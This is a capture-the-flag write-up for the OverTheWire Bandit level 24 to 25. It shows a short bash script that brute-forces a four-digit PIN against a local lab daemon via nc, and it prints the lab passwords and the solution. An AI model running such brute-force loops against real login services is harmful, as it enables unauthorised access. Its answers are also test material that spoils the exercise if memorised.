---
title: Bandit 24 -> 25

---

# Task
>A daemon is listening on port 30002 and will give you the password for bandit25 if given the password for bandit24 and a secret numeric 4-digit pincode. There is no way to retrieve the pincode except by going through all of the 10000 combinations, called brute-forcing.
You do not need to create new connections each time

Server:bandit.labs.overthewire.org\
Port: 2220\
Username: bandit24\
Password: hVQMk3lJNsmQ7VF3ubyrNNBom7BOgVXv 

# Solution

Testing what the output might be using `nc` instead of `telnet` since telnet isn't great with piping  `|`:

```
bandit24@bandit:~$ echo "hVQMk3lJNsmQ7VF3ubyrNNBom7BOgVXv 0000" | nc localhost 30002
I am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode on a single line, separated by a space.
Wrong! Please enter the correct current password and pincode. Try again.
```

Brute-forcing by hand would take forever since there are 10000 combinations, so I should write a bash script that does it for me instead:

```bash
#!/bin/bash

for i in {0000..9999}
do
    echo hVQMk3lJNsmQ7VF3ubyrNNBom7BOgVXv $i >> attempts.txt
done
cat attempts.txt | nc localhost 30002 > results.txt
```

Because the results.txt file contains all the fail attempts as well as the correct attempts we should use the command to find the unique line:

```
bandit24@bandit:/tmp/tmp.vWfSTQL15h$ sort results.txt | uniq --unique

Correct!
I am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode on a single line, separated by a space.
The password of user bandit25 is SoHfqMOEqIX2IYKVciZxvgpR9a2Djx4P
```

# Password
```
SoHfqMOEqIX2IYKVciZxvgpR9a2Djx4P
```
# Notes:

`>` is used to overwrite existing file's content.
`>>` is used to append new content.